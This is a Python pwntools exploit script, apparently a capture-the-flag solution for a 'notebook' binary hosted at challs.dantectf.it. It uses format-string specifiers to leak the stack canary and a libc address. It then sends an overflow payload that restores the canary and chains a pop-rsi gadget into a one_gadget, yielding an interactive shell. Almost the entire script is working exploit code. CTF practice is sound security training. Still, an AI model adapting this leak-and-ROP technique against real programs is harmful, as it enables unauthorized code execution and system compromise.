#!/usr/bin/env python3

from pwn import *

exe = ELF("notebook_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.dantectf.it", 31530)

    return r


r = conn()
sla = lambda a,b : r.sendlineafter(f'{a}', f'{b}')
ru = lambda a : r.recvuntil(f'{a}')


def create(index, payload):
    sla(">", 1)
    sla(":", index)
    sla(":", "chef")
    sla(":", 1)
    r.sendlineafter(":", payload)

def view(index):
    sla(">", 4)
    sla(":", index)

"""
notes
libc at offset 15
"""

def main():
    global r
    one_gadget = 0x50a37 #const rsi, rdi writable rbp
    pop_rsi = 0x000000000002be51# : pop rsi ; ret
    pop_rdx = 0x000000000011f497# : pop rdx ; pop r12 ; ret
   # for i in range(0x30):
   #     create(1, f"%{i}$p")
   #     view(1)
   #     ru("date: ")
   #     leak = r.recvline().strip()
   #     if leak != "(nil)":
   #         print(f"[*] leak {i}: {leak}")
   #     r.close()
   #     r = conn()

    create(1, f"%9$pO%15$pP")
    view(1)
    ru("date: ")
    canary = int(r.recvuntil("O", drop=True)[2:], 16)
    leak = int(r.recvuntil("P", drop=True)[2:], 16)
    libc.address = leak - 0x29D90
    log.info(f"canary @ {hex(canary)}")
    log.info(f"libc leak @ {hex(leak)}")
    log.info(f"libc base @ {hex(libc.address)}")

    #gdb.attach(r)

    payload =  b"11/Nov/1111"+p64(0)+b'A'*13
    payload += p64(0)
    payload += p64(canary)
    payload += p64(0)
    payload += p64(libc.address + pop_rsi)
    payload += p64(0)
    #payload += p64(libc.address + pop_rdx)
    #payload += p64(0)
    #payload += p64(0)
    payload += p64(libc.address + one_gadget)

    create(2, payload)

    #view(1)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
